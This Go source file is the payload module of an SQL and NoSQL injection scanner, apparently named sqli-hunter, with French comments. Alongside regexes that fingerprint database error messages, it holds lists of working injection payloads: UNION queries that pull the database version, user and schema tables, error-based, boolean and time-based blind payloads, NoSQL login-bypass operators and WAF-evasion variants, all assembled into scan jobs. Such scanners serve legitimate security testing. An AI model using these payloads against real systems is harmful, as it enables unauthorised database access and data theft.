package payloads

import (
	"fmt"
	"strings"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

// SQLErrorPatterns associe un DBMS à des motifs d'erreur SQL.
var SQLErrorPatterns = map[string][]string{
	"mysql": {
		`SQL syntax.*MySQL`,
		`Warning.*mysql_`,
		`MySQLSyntaxErrorException`,
		`valid MySQL result`,
		`check the manual that corresponds to your (MySQL|MariaDB)`,
		`Unknown column`,
		`You have an error in your SQL syntax`,
		`mysql_fetch`,
		`mysqli_`,
	},
	"postgresql": {
		`PostgreSQL.*ERROR`,
		`Warning.*\Wpg_`,
		`valid PostgreSQL result`,
		`Npgsql\.`,
		`PG::SyntaxError:`,
		`org\.postgresql\.util\.PSQLException`,
		`ERROR:\s+syntax error at or near`,
		`unterminated quoted string`,
	},
	"mssql": {
		`Driver.* SQL[\-\_\ ]*Server`,
		`OLE DB.* SQL Server`,
		`(\W|\A)SQL Server.*Driver`,
		`Warning.*mssql_`,
		`(\W|\A)SQL Server.*[Ee]xception`,
		`System\.Data\.SqlClient\.`,
		`Unclosed quotation mark`,
		`Microsoft SQL Native Client error`,
		`\[SQL Server\]`,
		`ODBC SQL Server Driver`,
		`SQLServer JDBC Driver`,
		`com\.microsoft\.sqlserver\.jdbc`,
	},
	"oracle": {
		`\bORA-\d{5}`,
		`Oracle error`,
		`Oracle.*Driver`,
		`Warning.*\Woci_`,
		`Warning.*\Wora_`,
		`quoted string not properly terminated`,
	},
	"sqlite": {
		`SQLite/JDBCDriver`,
		`SQLite\.Exception`,
		`System\.Data\.SQLite\.SQLiteException`,
		`Warning.*sqlite_`,
		`Warning.*SQLite3::`,
		`\[SQLITE_ERROR\]`,
		`SQLITE_CONSTRAINT`,
		`unrecognized token`,
		`near ".*": syntax error`,
	},
	"generic": {
		`SQL syntax`,
		`syntax error`,
		`unexpected end of SQL command`,
		`quoted string not properly terminated`,
		`unclosed quotation mark`,
		`SQL command not properly ended`,
	},
}

// NoSQLErrorPatterns pour MongoDB et autres.
var NoSQLErrorPatterns = []string{
	`MongoError`,
	`MongoDB`,
	`BSON`,
	`unknown operator`,
	`failed to parse`,
	`\$where`,
	`BadValue`,
	`SyntaxError.*json`,
	`Couchbase`,
	`Redis.*ERR`,
}

// Payloads orientés accès DB — extraction version/schémas
var (
	fastErrorPayloads = []string{
		"'",
		`' OR '1'='1'--`,
		`1' OR '1'='1--`,
		`') OR ('1'='1`,
		`1 OR 1=1--`,
		`admin'--`,
		`1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
		`1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--`,
	}

	fastUnionPayloads = []string{
		`' UNION SELECT NULL--`,
		`' UNION SELECT version(),NULL--`,
		`' UNION SELECT database(),NULL--`,
		`' UNION SELECT user(),NULL--`,
		`' UNION SELECT 1,@@version,3--`,
		`' UNION SELECT table_name,NULL FROM information_schema.tables--`,
	}

	fastBooleanTrue  = []string{`' OR '1'='1`, `' OR 1=1--`}
	fastBooleanFalse = []string{`' AND '1'='2`, `' AND 1=2--`}

	fastTimeTemplates = []string{
		`' AND SLEEP(%d)--`,
		`'; SELECT pg_sleep(%d)--`,
		`'; WAITFOR DELAY '0:0:%d'--`,
	}

	fastNoSQLPayloads = []string{
		`{"$gt":""}`,
		`{"$ne":null}`,
		`' || '1'=='1`,
		`"; return true; var a="`,
		`[$ne]=1`,
		`{"$regex":".*"}`,
	}

	fullErrorPayloads = []string{
		"'", `"`,
		`' OR '1'='1`, `' OR '1'='1'--`, `' OR '1'='1'#`,
		`') OR ('1'='1`, `1' OR '1'='1`, `1 OR 1=1--`,
		`admin'--`, `admin' #`,
		`1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
		`1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--`,
		`1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--`,
		`' AND 1=CONVERT(int,(SELECT @@version))--`,
		`' AND 1=CAST((SELECT @@version) AS int)--`,
		`'||(SELECT version())||'`,
		`'; SELECT version()--`,
	}

	fullUnionPayloads = []string{
		`' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--`,
		`' UNION SELECT version(),NULL--`, `' UNION SELECT database(),NULL--`,
		`' UNION SELECT user(),NULL--`, `' UNION SELECT @@version,NULL--`,
		`' UNION SELECT 1,@@version,3--`, `' UNION SELECT 1,version(),3--`,
		`' UNION SELECT table_name,NULL FROM information_schema.tables--`,
		`' UNION SELECT schema_name,NULL FROM information_schema.schemata--`,
		`' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables--`,
		`') UNION SELECT NULL--`, `0 UNION SELECT NULL,NULL--`,
	}

	fullBooleanTrue = []string{
		`' OR '1'='1`, `' OR 1=1--`, `' OR 1=1#`, `1 OR 1=1`,
		`1' OR '1'='1'--`, `') OR ('1'='1'--`,
	}
	fullBooleanFalse = []string{
		`' AND '1'='2`, `' AND 1=2--`, `' AND 1=2#`, `1 AND 1=2`,
		`1' AND '1'='2'--`, `') AND ('1'='2'--`,
	}

	fullTimeTemplates = []string{
		`' AND SLEEP(%d)--`, `' AND SLEEP(%d)#`,
		`1' AND SLEEP(%d)--`, `'; WAITFOR DELAY '0:0:%d'--`,
		`'; SELECT pg_sleep(%d)--`, `1'; SELECT pg_sleep(%d)--`,
		`' AND (SELECT * FROM (SELECT(SLEEP(%d)))a)--`,
		`' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--`,
	}

	fullNoSQLPayloads = []string{
		`{"$gt":""}`, `{"$ne":null}`, `{"$regex":".*"}`,
		`' || '1'=='1`, `"; return true; var a="`,
		`[$ne]=1`, `{"$where":"1==1"}`,
		`{"username":{"$gt":""},"password":{"$gt":""}}`,
		`0]; return db.users.find(); var foo=[0`,
		`' && this.password.match(/.*/)//`,
		`{"$or":[{"a":"a"},{"a":"a"}]}`,
	}

	wafBypassPayloads = []string{
		`' oR '1'='1`, `'%20OR%20'1'='1`, `'/**/OR/**/'1'='1`,
		`' UnIoN SeLeCt version(),NULL--`, `' /*!50000OR*/ '1'='1`,
		`1'||'1'='1`, `' OR 2>1--`,
	}
)

// BooleanPair associe un payload vrai et faux.
type BooleanPair struct {
	True  string
	False string
}

// BuildJobs génère les tests DB ordonnés par priorité.
func BuildJobs(opts models.ScanOptions) []models.TestJob {
	categories := opts.Categories
	if len(categories) == 0 {
		categories = DefaultCategories(opts.Mode)
	}

	full := opts.Mode == models.ScanFull
	var jobs []models.TestJob

	for _, cat := range categories {
		switch cat {
		case models.CategorySQLi:
			jobs = append(jobs, buildSQLiJobs(opts, full)...)
		case models.CategoryNoSQL:
			jobs = append(jobs, buildSimpleJobs(models.NoSQL, cat, nosqlPayloads(full), 30)...)
		}
	}

	if opts.IncludeWAF {
		for _, w := range wafBypassPayloads {
			jobs = append(jobs, models.TestJob{
				VulnType: models.SQLiError, Category: models.CategorySQLi,
				Payload: w, Priority: 2,
			})
		}
	}
	for _, c := range opts.CustomPayloads {
		jobs = append(jobs, models.TestJob{
			VulnType: models.SQLiError, Category: models.CategorySQLi,
			Payload: c, Priority: 1,
		})
	}

	return jobs
}

func buildSQLiJobs(opts models.ScanOptions, full bool) []models.TestJob {
	techniques := opts.Techniques
	if len(techniques) == 0 {
		techniques = DefaultSQLiTechniques(opts.Mode)
	}

	allowed := make(map[models.VulnType]bool)
	for _, t := range techniques {
		allowed[t] = true
	}

	var jobs []models.TestJob

	if allowed[models.SQLiError] {
		jobs = append(jobs, buildSimpleJobs(models.SQLiError, models.CategorySQLi, errorPayloads(full), 1)...)
	}
	if allowed[models.SQLiUnion] {
		jobs = append(jobs, buildSimpleJobs(models.SQLiUnion, models.CategorySQLi, unionPayloads(full), 10)...)
	}
	if allowed[models.SQLiBoolean] {
		for i, pair := range booleanPairs(full) {
			jobs = append(jobs, models.TestJob{
				VulnType: models.SQLiBoolean, Category: models.CategorySQLi,
				Payload: pair.True, PayloadB: pair.False, Priority: 20 + i,
			})
		}
	}
	if allowed[models.SQLiTime] {
		for i, p := range formatTime(timeTemplates(full), opts.TimeDelaySec) {
			jobs = append(jobs, models.TestJob{
				VulnType: models.SQLiTime, Category: models.CategorySQLi,
				Payload: p, Priority: 60 + i,
			})
		}
	}

	return jobs
}

func buildSimpleJobs(vt models.VulnType, cat models.VulnCategory, plist []string, basePriority int) []models.TestJob {
	jobs := make([]models.TestJob, 0, len(plist))
	for i, p := range plist {
		jobs = append(jobs, models.TestJob{
			VulnType: vt, Category: cat, Payload: p, Priority: basePriority + i,
		})
	}
	return jobs
}

func errorPayloads(full bool) []string {
	if full {
		return append([]string{}, fullErrorPayloads...)
	}
	return append([]string{}, fastErrorPayloads...)
}

func unionPayloads(full bool) []string {
	if full {
		return append([]string{}, fullUnionPayloads...)
	}
	return append([]string{}, fastUnionPayloads...)
}

func nosqlPayloads(full bool) []string {
	if full {
		return append([]string{}, fullNoSQLPayloads...)
	}
	return append([]string{}, fastNoSQLPayloads...)
}

func booleanPairs(full bool) []BooleanPair {
	t, f := fullBooleanTrue, fullBooleanFalse
	if !full {
		t, f = fastBooleanTrue, fastBooleanFalse
	}
	n := len(t)
	if len(f) < n {
		n = len(f)
	}
	pairs := make([]BooleanPair, 0, n)
	for i := 0; i < n; i++ {
		pairs = append(pairs, BooleanPair{True: t[i], False: f[i]})
	}
	return pairs
}

func timeTemplates(full bool) []string {
	if full {
		return append([]string{}, fullTimeTemplates...)
	}
	return append([]string{}, fastTimeTemplates...)
}

func formatTime(templates []string, delay int) []string {
	if delay < 1 {
		delay = 3
	}
	out := make([]string, 0, len(templates))
	for _, tmpl := range templates {
		out = append(out, fmt.Sprintf(tmpl, delay))
	}
	return out
}

// DefaultCategories : uniquement injections donnant accès DB.
func DefaultCategories(mode models.ScanMode) []models.VulnCategory {
	return []models.VulnCategory{models.CategorySQLi, models.CategoryNoSQL}
}

// DefaultSQLiTechniques retourne les techniques SQLi par défaut.
func DefaultSQLiTechniques(mode models.ScanMode) []models.VulnType {
	if mode == models.ScanFull {
		return []models.VulnType{models.SQLiError, models.SQLiUnion, models.SQLiBoolean, models.SQLiTime}
	}
	return []models.VulnType{models.SQLiError, models.SQLiUnion, models.SQLiBoolean}
}

// AllTechniques retourne toutes les techniques SQLi.
func AllTechniques() []models.VulnType {
	return []models.VulnType{models.SQLiError, models.SQLiBoolean, models.SQLiTime, models.SQLiUnion}
}

// ParseCategory parse une catégorie depuis la CLI.
func ParseCategory(s string) (models.VulnCategory, models.VulnType, error) {
	switch strings.ToLower(s) {
	case "sqli", "sql":
		return models.CategorySQLi, "", nil
	case "nosql", "mongo", "mongodb":
		return models.CategoryNoSQL, models.NoSQL, nil
	case "error", "error_based", "e":
		return models.CategorySQLi, models.SQLiError, nil
	case "boolean", "boolean_blind", "b":
		return models.CategorySQLi, models.SQLiBoolean, nil
	case "time", "time_blind", "t":
		return models.CategorySQLi, models.SQLiTime, nil
	case "union", "union_based", "u":
		return models.CategorySQLi, models.SQLiUnion, nil
	default:
		return "", "", fmt.Errorf("catégorie inconnue : %s (sqli, nosql, error, boolean, time, union)", s)
	}
}

// GetBooleanPairs retourne les paires boolean.
func GetBooleanPairs(full bool) []BooleanPair {
	return booleanPairs(full)
}

// GetPayloads rétrocompat.
func GetPayloads(techniques []models.VulnType, includeWAF bool, custom []string) map[models.VulnType][]string {
	result := make(map[models.VulnType][]string)
	for _, t := range techniques {
		switch t {
		case models.SQLiError:
			p := errorPayloads(true)
			if includeWAF {
				p = append(p, wafBypassPayloads...)
			}
			p = append(p, custom...)
			result[t] = p
		case models.SQLiBoolean:
			var combined []string
			for _, pair := range booleanPairs(true) {
				combined = append(combined, pair.True, pair.False)
			}
			result[t] = combined
		case models.SQLiTime:
			result[t] = timeTemplates(true)
		case models.SQLiUnion:
			result[t] = unionPayloads(true)
		}
	}
	return result
}

// FormatTimePayloads rétrocompat.
func FormatTimePayloads(delaySec int) []string {
	return formatTime(timeTemplates(true), delaySec)
}
